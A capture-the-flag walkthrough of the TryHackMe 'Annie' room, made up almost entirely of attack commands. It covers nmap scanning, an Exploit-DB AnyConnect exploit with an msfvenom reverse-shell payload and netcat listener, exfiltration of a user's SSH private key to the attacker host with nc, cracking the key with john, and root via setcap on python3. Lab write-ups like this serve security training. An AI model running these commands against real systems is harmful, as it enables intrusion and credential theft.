# Annie

**Room Link:** [https://tryhackme.com/room/annie](https://tryhackme.com/room/annie)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (447).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (448).png" alt=""><figcaption></figcaption></figure>



### TCP/7070 - AnyConnect

**Exploit:** [https://www.exploit-db.com/raw/49613](https://www.exploit-db.com/raw/49613)



Took for the code above and just had to change the shellcode and ip variable.

**Kali**

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
```

**Kali**

```
nc -lvnp 4444
```

<figure><img src="../../.gitbook/assets/image (449).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (450).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



**Victim**

```
cat /home/annie/.ssh/id_rsa
nc -w 3 $KALI 1234 < /home/annie/.ssh/id_rsa
```

<figure><img src="../../.gitbook/assets/image (451).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -l -p 1234 > id_rsa
/opt/john/ssh2john.py id_rsa > id_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_john.txt 
```

<figure><img src="../../.gitbook/assets/image (452).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh -i id_rsa annie@$VICTIM
```

## Privilege Escalation

**Victim**

```
find / -perm -u=s -type f 2> /dev/null
```

<figure><img src="../../.gitbook/assets/image (453).png" alt=""><figcaption></figcaption></figure>



**Victim**

<pre><code>cp /usr/bin/python3 /home/annie/python3
setcap cap_setuid+ep /home/annie/python3
<strong>ls -al /home/annie/python3
</strong>/home/annie/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
</code></pre>

<figure><img src="../../.gitbook/assets/image (454).png" alt=""><figcaption></figcaption></figure>











